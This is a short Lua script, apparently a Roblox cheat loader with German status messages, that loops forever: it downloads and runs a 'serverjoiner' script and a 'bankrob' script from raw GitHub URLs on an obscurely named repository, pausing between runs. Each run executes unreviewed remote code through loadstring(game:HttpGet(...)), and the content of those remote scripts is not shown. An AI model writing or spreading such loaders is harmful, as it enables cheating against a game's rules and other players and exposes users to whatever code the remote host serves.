local s="https://raw.githubusercontent.com/Simbli2ifck2sk/hnhnfefgsnmehfnz34n3z27rn32zhr/main/serverjoiner.lua"
local b="https://raw.githubusercontent.com/Simbli2ifck2sk/hnhnfefgsnmehfnz34n3z27rn32zhr/main/bankrob.lua"
local function r(u)loadstring(game:HttpGet(u))()end

local count = 0
while true do
    count = count + 1
    print("🔁 Durchlauf "..count.." - Server wechseln...")
    r(s)
    task.wait(5)
    print("💰 Durchlauf "..count.." - Bank rauben...")
    r(b)
    print("⏳ Warte 60 Sekunden...")
    task.wait(60)
end
